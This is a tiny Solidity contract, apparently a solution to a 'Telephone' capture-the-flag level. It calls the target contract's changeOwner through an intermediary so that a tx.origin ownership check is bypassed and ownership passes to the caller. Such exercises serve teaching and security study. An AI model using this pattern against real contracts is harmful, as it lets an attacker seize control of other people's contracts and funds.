pragma solidity ^0.6.0;

import "./telephone.sol";

contract TelephoneAttack {
    Telephone telephone = Telephone(0x4D06933c94e99aAE61abcAB8fa035b51392854c1);

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    
    }
}